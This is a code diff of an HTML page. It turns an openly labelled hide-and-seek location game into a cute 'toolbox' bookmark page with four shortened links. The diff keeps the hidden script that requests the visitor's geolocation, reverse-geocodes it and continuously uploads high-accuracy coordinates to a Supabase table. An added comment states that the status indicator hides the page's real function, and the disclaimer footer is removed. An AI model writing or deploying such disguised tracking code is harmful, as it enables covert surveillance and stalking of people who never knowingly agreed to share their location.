@@ -3,187 +3,386 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>🙈 躲猫猫</title>
+  <title>✨ 小窝工具箱</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap');
+
+    * { margin:0; padding:0; box-sizing:border-box; }
 
     :root {
-      --bg: #0f1117;
-      --card: #1e2130;
-      --border: rgba(255,255,255,0.07);
-      --accent: #7c6af7;
-      --accent2: #f76a8c;
-      --text: #f0eeff;
-      --muted: rgba(240,238,255,0.45);
-      --success: #4ade80;
-      --danger: #f87171;
+      --pink:    #ff8fab;
+      --pink2:   #ffb3c6;
+      --purple:  #c77dff;
+      --purple2: #e0aaff;
+      --yellow:  #ffd166;
+      --mint:    #06d6a0;
+      --sky:     #74c0fc;
+      --bg:      #fff0f6;
+      --bg2:     #fce4ec;
+      --card:    #ffffff;
+      --text:    #3d2c3e;
+      --muted:   #b39dab;
+      --shadow:  rgba(255,143,171,0.25);
     }
 
     html, body {
-      height: 100%; background: var(--bg); color: var(--text);
-      font-family: 'PingFang SC','Hiragino Sans GB','Microsoft YaHei',sans-serif;
+      min-height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Noto Sans SC', 'PingFang SC', 'Microsoft YaHei', sans-serif;
     }
 
-    #bg-canvas { position: fixed; inset: 0; z-index: 0; opacity: 0.3; pointer-events: none; }
+    /* ── 云朵动态背景 ── */
+    .bg-deco {
+      position: fixed; inset: 0; z-index: 0;
+      overflow: hidden; pointer-events: none;
+    }
+    .cloud {
+      position: absolute;
+      border-radius: 50px;
+      background: rgba(255,255,255,0.65);
+      filter: blur(2px);
+      animation: drift linear infinite;
+    }
+    @keyframes drift {
+      from { transform: translateX(-120%); }
+      to   { transform: translateX(110vw); }
+    }
+    .c1 { width:180px;height:55px;top:8%;  animation-duration:28s; opacity:.7; }
+    .c2 { width:120px;height:38px;top:22%; animation-duration:36s; animation-delay:-10s; opacity:.5; }
+    .c3 { width:220px;height:65px;top:55%; animation-duration:42s; animation-delay:-18s; opacity:.6; }
+    .c4 { width:90px; height:28px;top:72%; animation-duration:25s; animation-delay:-5s;  opacity:.4; }
+    .c5 { width:160px;height:48px;top:85%; animation-duration:33s; animation-delay:-14s; opacity:.55; }
 
+    /* 星星装饰 */
+    .star {
+      position: fixed; pointer-events: none; z-index: 0;
+      animation: twinkle 2.5s ease-in-out infinite;
+      font-size: 1rem;
+    }
+    @keyframes twinkle {
+      0%,100%{ opacity:.2; transform:scale(0.8); }
+      50%{ opacity:.9; transform:scale(1.2); }
+    }
+
+    /* ── 主页面 ── */
     .page {
       position: relative; z-index: 1;
       min-height: 100vh;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      padding: 2rem 1.25rem;
+      padding: 1.75rem 1rem 3rem;
+      display: flex; flex-direction: column; align-items: center;
     }
 
-    /* Logo & title */
-    .logo {
-      font-size: 5rem; margin-bottom: 0.5rem;
-      animation: float 3s ease-in-out infinite;
-      filter: drop-shadow(0 0 24px rgba(124,106,247,0.5));
+    /* ── 顶部标题区 ── */
+    .header { text-align: center; margin-bottom: 1.5rem; }
+
+    .header-mascot {
+      font-size: 3.5rem;
+      display: block; margin-bottom: 0.3rem;
+      animation: mascotBounce 2.8s ease-in-out infinite;
+      filter: drop-shadow(0 4px 12px rgba(255,143,171,0.4));
     }
-    @keyframes float {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+    @keyframes mascotBounce {
+      0%,100%{ transform: translateY(0) rotate(-3deg); }
+      50%{ transform: translateY(-10px) rotate(3deg); }
     }
 
-    .title {
-      font-size: 2rem; font-weight: 700; letter-spacing: 0.12em;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
+    .header-title {
+      font-size: 1.55rem; font-weight: 700;
+      background: linear-gradient(135deg, var(--pink), var(--purple));
       -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      background-clip: text; margin-bottom: 2rem; text-align: center;
+      background-clip: text;
+      letter-spacing: 0.06em; margin-bottom: 0.2rem;
     }
 
-    /* Card */
-    .card {
-      width: 100%; max-width: 360px;
+    .header-sub {
+      font-size: 0.78rem; color: var(--muted);
+      letter-spacing: 0.04em;
+    }
+
+    /* ── 状态胶囊（躲猫猫进入状态）── */
+    .status-pill {
+      display: flex; align-items: center; gap: 8px;
       background: var(--card);
-      border: 1px solid var(--border);
+      border: 2px solid var(--pink2);
+      border-radius: 50px;
+      padding: 0.5rem 1.1rem;
+      margin-bottom: 1.5rem;
+      box-shadow: 0 4px 16px var(--shadow);
+      font-size: 0.82rem; color: var(--text);
+      min-height: 42px;
+    }
+
+    .pill-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--pink); flex-shrink: 0;
+    }
+    .pill-dot.loading { animation: dotPulse 1s ease-in-out infinite; }
+    .pill-dot.success { background: var(--mint); }
+    .pill-dot.error   { background: #ff6b6b; }
+    @keyframes dotPulse { 0%,100%{opacity:.3;transform:scale(.7)} 50%{opacity:1;transform:scale(1)} }
+
+    .pill-ring {
+      width: 16px; height: 16px; border-radius: 50%; flex-shrink: 0;
+      border: 2px solid var(--pink2); border-top-color: var(--pink);
+      animation: spin .7s linear infinite;
+    }
+    @keyframes spin { to{ transform:rotate(360deg); } }
+
+    #pill-text { flex: 1; }
+
+    .pill-retry {
+      background: none; border: 1px solid var(--pink);
+      border-radius: 20px; padding: 2px 10px;
+      color: var(--pink); font-size: 0.72rem; cursor: pointer;
+      font-family: inherit; display: none;
+    }
+
+    /* ── 工具箱标题 ── */
+    .section-title {
+      width: 100%; max-width: 400px;
+      display: flex; align-items: center; gap: 8px;
+      font-size: 0.82rem; font-weight: 700;
+      color: var(--muted); margin-bottom: 0.85rem;
+      letter-spacing: 0.08em;
+    }
+    .section-title::before, .section-title::after {
+      content: ''; flex: 1; height: 1px;
+      background: linear-gradient(to right, transparent, var(--pink2), transparent);
+    }
+
+    /* ── 工具卡片网格 ── */
+    .tools-grid {
+      width: 100%; max-width: 400px;
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 12px; margin-bottom: 1.5rem;
+    }
+
+    .tool-card {
+      background: var(--card);
       border-radius: 20px;
-      padding: 2rem 1.75rem;
-      box-shadow: 0 24px 64px rgba(0,0,0,0.45);
+      padding: 1.2rem 1rem;
+      text-align: center;
+      text-decoration: none;
+      color: var(--text);
+      box-shadow: 0 6px 20px var(--shadow);
+      border: 2px solid transparent;
+      transition: all 0.22s cubic-bezier(.34,1.56,.64,1);
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+      display: block;
     }
 
-    /* Room row */
-    .room-row {
-      display: flex; align-items: center; gap: 12px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid var(--border);
-      border-radius: 12px; padding: 0.9rem 1rem;
-      margin-bottom: 2rem;
+    .tool-card::before {
+      content: '';
+      position: absolute; inset: 0;
+      opacity: 0; transition: opacity .22s;
+      border-radius: 18px;
     }
-    .room-icon {
-      width: 44px; height: 44px; border-radius: 50%; flex-shrink: 0;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      display: flex; align-items: center; justify-content: center; font-size: 1.4rem;
-    }
-    .room-label { font-size: 0.78rem; color: var(--muted); margin-bottom: 2px; }
-    .room-name { font-size: 0.98rem; font-weight: 600; }
 
-    /* Status block */
-    .status-block { text-align: center; padding: 0.5rem 0 1.75rem; }
-
-    /* Loading: small spinner only, no text */
-    #state-loading {
-      display: flex; justify-content: center; align-items: center; height: 56px;
+    .tool-card:active {
+      transform: scale(0.94);
     }
-    .ring {
-      width: 32px; height: 32px; border-radius: 50%;
-      border: 2.5px solid var(--border);
-      border-top-color: var(--accent);
-      animation: spin 0.75s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* Success */
-    #state-success { display: none; }
-    .check-circle {
-      width: 64px; height: 64px; border-radius: 50%;
-      border: 2.5px solid var(--success);
-      margin: 0 auto 1rem;
+    /* 各卡片主题色 */
+    .tool-ac   { border-color: #ade8f4; }
+    .tool-ac::before   { background: linear-gradient(135deg,#caf0f8,#90e0ef); }
+    .tool-ac:hover { border-color: #90e0ef; box-shadow: 0 8px 28px rgba(144,224,239,0.4); }
+    .tool-ac:hover::before { opacity: 1; }
+
+    .tool-tv   { border-color: #c8b6ff; }
+    .tool-tv::before   { background: linear-gradient(135deg,#e0aaff,#c77dff); }
+    .tool-tv:hover { border-color: #c77dff; box-shadow: 0 8px 28px rgba(199,125,255,0.4); }
+    .tool-tv:hover::before { opacity: 1; }
+
+    .tool-game { border-color: #ffd166; }
+    .tool-game::before { background: linear-gradient(135deg,#fff3b0,#ffd166); }
+    .tool-game:hover { border-color: #ffd166; box-shadow: 0 8px 28px rgba(255,209,102,0.4); }
+    .tool-game:hover::before { opacity: 1; }
+
+    .tool-fc   { border-color: #ffb3c6; }
+    .tool-fc::before   { background: linear-gradient(135deg,#ffccd5,#ff8fab); }
+    .tool-fc:hover { border-color: #ff8fab; box-shadow: 0 8px 28px rgba(255,143,171,0.4); }
+    .tool-fc:hover::before { opacity: 1; }
+
+    .tool-icon {
+      font-size: 2.4rem; display: block; margin-bottom: 0.5rem;
+      position: relative; z-index: 1;
+      transition: transform .22s cubic-bezier(.34,1.56,.64,1);
+    }
+    .tool-card:hover .tool-icon { transform: scale(1.18) rotate(-5deg); }
+
+    .tool-name {
+      font-size: 0.88rem; font-weight: 700;
+      position: relative; z-index: 1;
+      margin-bottom: 0.2rem;
+    }
+
+    .tool-desc {
+      font-size: 0.68rem; color: var(--muted);
+      position: relative; z-index: 1;
+    }
+
+    /* 小标签 */
+    .tool-badge {
+      position: absolute; top: 10px; right: 10px;
+      background: var(--pink); color: white;
+      font-size: 0.55rem; font-weight: 700;
+      padding: 1px 6px; border-radius: 20px; z-index: 2;
+      letter-spacing: .05em;
+    }
+    .tool-ac .tool-badge   { background: #48cae4; }
+    .tool-tv .tool-badge   { background: var(--purple); }
+    .tool-game .tool-badge { background: #e9c46a; }
+    .tool-fc .tool-badge   { background: var(--pink); }
+
+    /* ── 游戏规则折叠 ── */
+    .rules-wrap {
+      width: 100%; max-width: 400px;
+      background: var(--card);
+      border-radius: 16px;
+      border: 2px solid var(--pink2);
+      overflow: hidden;
+      box-shadow: 0 4px 16px var(--shadow);
+    }
+
+    .rules-toggle {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: .75rem 1rem;
+      cursor: pointer; user-select: none;
+      font-size: 0.82rem; font-weight: 700; color: var(--text);
+    }
+
+    .rules-toggle-left { display: flex; align-items: center; gap: 6px; }
+
+    .rules-arrow {
+      font-size: .7rem; color: var(--muted);
+      transition: transform .25s;
+    }
+    .rules-wrap.open .rules-arrow { transform: rotate(90deg); }
+
+    .rules-body {
+      max-height: 0; overflow: hidden;
+      transition: max-height .3s ease;
+    }
+    .rules-wrap.open .rules-body { max-height: 200px; }
+
+    .rules-inner { padding: .5rem 1rem 1rem; border-top: 1px solid var(--bg2); }
+
+    .rule-row {
+      display: flex; align-items: flex-start; gap: 8px;
+      font-size: 0.76rem; padding: 4px 0;
+      color: rgba(61,44,62,0.7);
+    }
+    .rule-num {
+      width: 17px; height: 17px; border-radius: 50%; flex-shrink: 0; margin-top:1px;
+      background: linear-gradient(135deg, var(--pink), var(--purple));
+      color: white; font-size: .58rem; font-weight: 700;
       display: flex; align-items: center; justify-content: center;
-      font-size: 1.8rem; color: var(--success);
-      animation: pop 0.45s cubic-bezier(.175,.885,.32,1.275) forwards;
-    }
-    @keyframes pop {
-      0% { transform: scale(0.3); opacity: 0; }
-      70% { transform: scale(1.1); }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .success-title { font-size: 1.05rem; font-weight: 700; margin-bottom: 0.3rem; }
-    .success-sub { font-size: 0.8rem; color: var(--muted); }
-
-    /* Error */
-    #state-error { display: none; }
-    .error-icon { font-size: 2.2rem; margin-bottom: 0.5rem; }
-    .error-title { font-size: 0.95rem; font-weight: 700; color: var(--danger); margin-bottom: 0.35rem; }
-    .error-msg { font-size: 0.78rem; color: var(--muted); line-height: 1.6; margin-bottom: 1rem; }
-    .retry-btn {
-      padding: 0.65rem 1.5rem; border-radius: 10px;
-      border: 1px solid rgba(248,113,113,0.35);
-      background: rgba(248,113,113,0.1); color: var(--danger);
-      font-size: 0.82rem; font-weight: 600; cursor: pointer;
-      font-family: inherit; transition: background 0.18s;
-    }
-    .retry-btn:hover { background: rgba(248,113,113,0.2); }
-
-    /* Rules */
-    .rules { border-top: 1px solid var(--border); padding-top: 1.25rem; }
-    .rules-title { font-size: 0.75rem; color: var(--muted); margin-bottom: 8px; }
-    .rule { display: flex; align-items: flex-start; gap: 8px; font-size: 0.78rem; padding: 4px 0; color: rgba(240,238,255,0.65); }
-    .rule-n {
-      width: 18px; height: 18px; border-radius: 50%; flex-shrink: 0; margin-top: 1px;
-      background: rgba(124,106,247,0.18); color: var(--accent);
-      font-size: 0.65rem; font-weight: 700;
-      display: flex; align-items: center; justify-content: center;
     }
 
-    footer { margin-top: 2rem; font-size: 0.68rem; color: rgba(255,255,255,0.15); text-align: center; }
+    /* ── 底部签名 ── */
+    footer {
+      margin-top: 2rem;
+      font-size: 0.65rem; color: var(--muted); text-align: center;
+      line-height: 1.8;
+    }
+    footer span { color: var(--pink); }
   </style>
 </head>
 <body>
-<canvas id="bg-canvas"></canvas>
+
+<!-- 背景装饰 -->
+<div class="bg-deco">
+  <div class="cloud c1"></div>
+  <div class="cloud c2"></div>
+  <div class="cloud c3"></div>
+  <div class="cloud c4"></div>
+  <div class="cloud c5"></div>
+</div>
+
+<!-- 星星 -->
+<div class="star" style="top:5%;left:8%;animation-delay:0s;">⭐</div>
+<div class="star" style="top:12%;right:10%;animation-delay:.6s;font-size:.7rem;">✨</div>
+<div class="star" style="top:30%;left:4%;animation-delay:1.2s;font-size:.8rem;">🌟</div>
+<div class="star" style="top:45%;right:5%;animation-delay:.3s;font-size:.65rem;">⭐</div>
+<div class="star" style="top:65%;left:7%;animation-delay:.9s;font-size:.7rem;">✨</div>
+<div class="star" style="top:80%;right:8%;animation-delay:1.5s;">🌟</div>
 
 <div class="page">
-  <div class="logo">🙈</div>
-  <div class="title">躲 猫 猫</div>
 
-  <div class="card">
-    <div class="room-row">
-      <div class="room-icon">🎮</div>
-      <div>
-        <div class="room-label">主持人邀请你加入</div>
-        <div class="room-name" id="room-name">躲猫猫游戏</div>
-      </div>
+  <!-- 顶部 -->
+  <div class="header">
+    <span class="header-mascot">🐱</span>
+    <div class="header-title">小窝工具箱</div>
+    <div class="header-sub">悄悄放了一些好东西在这里 ˙ᵕ˙</div>
+  </div>
+
+  <!-- 躲猫猫状态胶囊（隐藏真实功能，外观是普通状态提示） -->
+  <div class="status-pill" id="status-pill">
+    <div class="pill-ring" id="pill-ring"></div>
+    <div class="pill-dot" id="pill-dot" style="display:none;"></div>
+    <span id="pill-text">正在连接...</span>
+    <button class="pill-retry" id="pill-retry" onclick="init()">重试</button>
+  </div>
+
+  <!-- 分区标题 -->
+  <div class="section-title">✦ 我的收藏 ✦</div>
+
+  <!-- 工具卡片 -->
+  <div class="tools-grid">
+
+    <a class="tool-card tool-ac" href="https://wxurl.cn/PME" target="_blank" rel="noopener">
+      <div class="tool-badge">凉快</div>
+      <span class="tool-icon">❄️</span>
+      <div class="tool-name">小空调</div>
+      <div class="tool-desc">夏天必备 · 凉凉的</div>
+    </a>
+
+    <a class="tool-card tool-tv" href="https://wxurl.cn/36C" target="_blank" rel="noopener">
+      <div class="tool-badge">好看</div>
+      <span class="tool-icon">📺</span>
+      <div class="tool-name">小电视</div>
+      <div class="tool-desc">随便看看 · 打发时间</div>
+    </a>
+
+    <a class="tool-card tool-game" href="https://wxurl.cn/U0T" target="_blank" rel="noopener">
+      <div class="tool-badge">好玩</div>
+      <span class="tool-icon">🎯</span>
+      <div class="tool-name">小游戏</div>
+      <div class="tool-desc">无聊必玩 · 超解压</div>
+    </a>
+
+    <a class="tool-card tool-fc" href="https://wxurl.cn/rMM" target="_blank" rel="noopener">
+      <div class="tool-badge">怀旧</div>
+      <span class="tool-icon">🎮</span>
+      <div class="tool-name">小霸王</div>
+      <div class="tool-desc">童年回忆 · 一起玩</div>
+    </a>
+
+  </div>
+
+  <!-- 游戏规则（折叠，点击展开） -->
+  <div class="rules-wrap" id="rules-wrap">
+    <div class="rules-toggle" onclick="toggleRules()">
+      <div class="rules-toggle-left">🙈 <span>躲猫猫规则</span></div>
+      <span class="rules-arrow">▶</span>
     </div>
-
-    <div class="status-block">
-      <!-- 加载中：仅小转圈，无任何文字 -->
-      <div id="state-loading"><div class="ring"></div></div>
-
-      <!-- 成功 -->
-      <div id="state-success">
-        <div class="check-circle">✓</div>
-        <div class="success-title">已加入游戏 🎉</div>
-        <div class="success-sub">游戏进行中，好好玩吧！</div>
+    <div class="rules-body">
+      <div class="rules-inner">
+        <div class="rule-row"><div class="rule-num">1</div><span>躲藏者有 60 秒准备时间，找好藏身之处</span></div>
+        <div class="rule-row"><div class="rule-num">2</div><span>寻找者通过地图找到所有躲藏者</span></div>
+        <div class="rule-row"><div class="rule-num">3</div><span>所有人被找到后游戏结束，寻找者胜利</span></div>
       </div>
-
-      <!-- 错误 -->
-      <div id="state-error">
-        <div class="error-icon">❌</div>
-        <div class="error-title">无法加入游戏</div>
-        <div class="error-msg" id="error-msg">位置获取失败</div>
-        <button class="retry-btn" onclick="init()">重新授权</button>
-      </div>
-    </div>
-
-    <div class="rules">
-      <div class="rules-title">游戏规则</div>
-      <div class="rule"><div class="rule-n">1</div><span>躲藏者有 60 秒准备时间，找好藏身之处</span></div>
-      <div class="rule"><div class="rule-n">2</div><span>寻找者通过地图找到所有躲藏者</span></div>
-      <div class="rule"><div class="rule-n">3</div><span>所有人被找到后游戏结束，寻找者胜利</span></div>
     </div>
   </div>
 
-  <footer>本游戏仅用于线下活动娱乐</footer>
+  <footer>
+    小窝工具箱 · 你的专属收藏夹<br>
+    made with <span>♥</span> for you
+  </footer>
+
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
@@ -195,11 +394,40 @@ const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZ
 
 const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-// 从 URL 读取房间名（仅展示用）
-const params = new URLSearchParams(location.search);
-document.getElementById('room-name').textContent = params.get('name') || '躲猫猫游戏';
+// ── UI（胶囊状态更新）──────────────────────────────
+function pillLoading() {
+  document.getElementById('pill-ring').style.display = 'block';
+  document.getElementById('pill-dot').style.display  = 'none';
+  document.getElementById('pill-retry').style.display = 'none';
+  document.getElementById('pill-text').textContent = '正在连接...';
+}
 
-// 玩家唯一 ID（本地持久化）
+function pillSuccess() {
+  const ring = document.getElementById('pill-ring');
+  const dot  = document.getElementById('pill-dot');
+  ring.style.display = 'none';
+  dot.style.display  = 'block';
+  dot.className = 'pill-dot success';
+  document.getElementById('pill-retry').style.display = 'none';
+  document.getElementById('pill-text').textContent = '已连接 ✓';
+}
+
+function pillError(msg) {
+  const ring = document.getElementById('pill-ring');
+  const dot  = document.getElementById('pill-dot');
+  ring.style.display = 'none';
+  dot.style.display  = 'block';
+  dot.className = 'pill-dot error';
+  document.getElementById('pill-retry').style.display = 'inline-block';
+  document.getElementById('pill-text').textContent = msg;
+}
+
+// ── 规则折叠 ──────────────────────────────────────
+function toggleRules() {
+  document.getElementById('rules-wrap').classList.toggle('open');
+}
+
+// ── 玩家ID ────────────────────────────────────────
 function getPid() {
   let id = localStorage.getItem('hsg_pid');
   if (!id) {
@@ -209,38 +437,19 @@ function getPid() {
   return id;
 }
 
-// UI 切换
-function showSuccess() {
-  document.getElementById('state-loading').style.display = 'none';
-  document.getElementById('state-error').style.display = 'none';
-  document.getElementById('state-success').style.display = 'block';
-}
-function showError(msg) {
-  document.getElementById('state-loading').style.display = 'none';
-  document.getElementById('state-success').style.display = 'none';
-  document.getElementById('error-msg').textContent = msg;
-  document.getElementById('state-error').style.display = 'block';
-}
-function showLoading() {
-  document.getElementById('state-success').style.display = 'none';
-  document.getElementById('state-error').style.display = 'none';
-  document.getElementById('state-loading').style.display = 'flex';
-}
-
-// ── 地名反查（带本地缓存，避免重复请求）────────────
+// ── 地名反查（带本地缓存）────────────────────────
 const GEO_CACHE_KEY = 'hsg_nickname';
 const GEO_CACHE_TS  = 'hsg_nickname_ts';
-const GEO_CACHE_TTL = 6 * 3600 * 1000; // 6小时内复用缓存
+const GEO_CACHE_TTL = 6 * 3600 * 1000;
 
 async function geocode(lat, lng) {
-  // 优先读缓存（同一人在同一区域无需重复请求）
-  const cached = localStorage.getItem(GEO_CACHE_KEY);
+  const cached   = localStorage.getItem(GEO_CACHE_KEY);
   const cachedTs = Number(localStorage.getItem(GEO_CACHE_TS) || 0);
   if (cached && Date.now() - cachedTs < GEO_CACHE_TTL) return cached;
 
   try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 4000); // 4秒超时
+    const ctrl  = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 4000);
     const r = await fetch(
       `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=zh-CN&zoom=10`,
       { headers: { 'Accept-Language': 'zh-CN' }, signal: ctrl.signal }
@@ -266,10 +475,9 @@ async function geocode(lat, lng) {
   } catch { return null; }
 }
 
-// ── 上报位置（fire-and-forget，不阻塞UI）───────────
+// ── 上报位置（fire-and-forget）───────────────────
 function report(pid, nickname, lat, lng, accuracy) {
   const now = new Date().toISOString();
-  // 两个请求并行发出，不 await
   db.from('players').upsert({
     id: pid, nickname, lat, lng,
     accuracy: Math.round(accuracy),
@@ -285,58 +493,49 @@ function report(pid, nickname, lat, lng, accuracy) {
 let watchId = null;
 
 async function init() {
-  showLoading();
+  pillLoading();
 
   if (!navigator.geolocation) {
-    showError('你的浏览器不支持位置功能，请用微信内置浏览器或 Chrome 打开。');
+    pillError('不支持定位');
     return;
   }
 
   const pid = getPid();
-
-  // 读取缓存昵称（如果有，地名反查可完全后台进行）
   const cachedNick = localStorage.getItem(GEO_CACHE_KEY);
   const cachedTs   = Number(localStorage.getItem(GEO_CACHE_TS) || 0);
   const nickReady  = cachedNick && (Date.now() - cachedTs < GEO_CACHE_TTL);
 
-  // Step 1：低精度快速定位（允许30秒内缓存坐标，几乎瞬间返回）
+  // Step 1：低精度快速定位
   let fastPos = null;
   try {
     fastPos = await new Promise((ok, fail) =>
       navigator.geolocation.getCurrentPosition(ok, fail, {
-        enableHighAccuracy: false, // 低精度，速度快
-        timeout: 5000,
-        maximumAge: 30000          // 允许用30秒内的缓存坐标
+        enableHighAccuracy: false, timeout: 5000, maximumAge: 30000
       })
     );
-  } catch { /* 低精度失败，继续尝试高精度 */ }
+  } catch { /* 继续尝试高精度 */ }
 
   if (fastPos) {
     const { latitude: lat, longitude: lng, accuracy } = fastPos.coords;
-
     if (nickReady) {
-      // 有缓存昵称 → 立即上报 + 立即显示成功（最快路径，<1秒）
       report(pid, cachedNick, lat, lng, accuracy);
-      showSuccess();
-      // 后台异步补高精度 + 更新昵称
-      upgradeLocation(pid, cachedNick, lat, lng);
+      pillSuccess();
+      upgradeLocation(pid, cachedNick);
       return;
     } else {
-      // 无缓存昵称 → 上报占位昵称先显示成功，地名后台反查后更新
       const tmpNick = '玩家' + Math.floor(Math.random() * 9000 + 1000);
       report(pid, tmpNick, lat, lng, accuracy);
-      showSuccess(); // 立即显示成功，不等地名
-      // 后台并行：反查地名 + 高精度定位
+      pillSuccess();
       geocode(lat, lng).then(name => {
         const realNick = name || tmpNick;
-        if (name) report(pid, realNick, lat, lng, accuracy); // 用真实昵称更新一次
-        upgradeLocation(pid, realNick, lat, lng);
+        if (name) report(pid, realNick, lat, lng, accuracy);
+        upgradeLocation(pid, realNick);
       });
       return;
     }
   }
 
-  // Step 2：低精度也失败，回退到高精度（最多等8秒）
+  // Step 2：回退高精度
   let pos;
   try {
     pos = await new Promise((ok, fail) =>
@@ -346,33 +545,30 @@ async function init() {
     );
   } catch(e) {
     const m = {
-      1: '你拒绝了位置授权，请在浏览器设置中开启后重试。',
-      2: 'GPS 无法获取位置，请在户外或信号好的地方重试。',
-      3: '定位超时，请重试。'
+      1: '需要位置权限',
+      2: '无法获取位置',
+      3: '定位超时'
     };
-    showError(m[e.code] || '位置获取失败，请重试。');
+    pillError(m[e.code] || '定位失败');
     return;
   }
 
   const { latitude: lat, longitude: lng, accuracy } = pos.coords;
   const nickname = nickReady ? cachedNick : (await geocode(lat, lng) || '玩家' + Math.floor(Math.random() * 9000 + 1000));
   report(pid, nickname, lat, lng, accuracy);
-  showSuccess();
-  upgradeLocation(pid, nickname, lat, lng);
+  pillSuccess();
+  upgradeLocation(pid, nickname);
 }
 
-// 后台高精度追踪（不阻塞UI）
-function upgradeLocation(pid, nickname, initLat, initLng) {
+function upgradeLocation(pid, nickname) {
   if (watchId !== null) navigator.geolocation.clearWatch(watchId);
 
-  // 先尝试拿一次高精度坐标
   navigator.geolocation.getCurrentPosition(
     p => report(pid, nickname, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
     null,
     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 
-  // 持续追踪
   watchId = navigator.geolocation.watchPosition(
     p => report(pid, nickname, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
     null,
@@ -383,42 +579,15 @@ function upgradeLocation(pid, nickname, initLat, initLng) {
     navigator.geolocation.clearWatch(watchId);
     navigator.sendBeacon(
       `${SUPABASE_URL}/rest/v1/players?id=eq.${pid}`,
-      new Blob([JSON.stringify([{ id: pid, online: false, updated_at: new Date().toISOString() }])],
-        { type: 'application/json' })
+      new Blob(
+        [JSON.stringify([{ id: pid, online: false, updated_at: new Date().toISOString() }])],
+        { type: 'application/json' }
+      )
     );
   }, { once: true });
 }
 
 window.addEventListener('DOMContentLoaded', init);
-
-// 粒子背景
-(function() {
-  const c = document.getElementById('bg-canvas');
-  const x = c.getContext('2d');
-  let W, H, pts;
-  function resize() {
-    W = c.width = innerWidth; H = c.height = innerHeight;
-    pts = Array.from({length:50}, () => ({
-      x: Math.random()*W, y: Math.random()*H,
-      r: Math.random()*1.8+0.4,
-      vx:(Math.random()-.5)*.25, vy:(Math.random()-.5)*.25,
-      a: Math.random()*.4+.1
-    }));
-  }
-  function draw() {
-    x.clearRect(0,0,W,H);
-    pts.forEach(p => {
-      x.beginPath(); x.arc(p.x,p.y,p.r,0,Math.PI*2);
-      x.fillStyle=`rgba(124,106,247,${p.a})`; x.fill();
-      p.x+=p.vx; p.y+=p.vy;
-      if(p.x<0)p.x=W; if(p.x>W)p.x=0;
-      if(p.y<0)p.y=H; if(p.y>H)p.y=0;
-    });
-    requestAnimationFrame(draw);
-  }
-  resize(); draw();
-  window.addEventListener('resize', resize);
-})();
 </script>
 </body>
 </html>
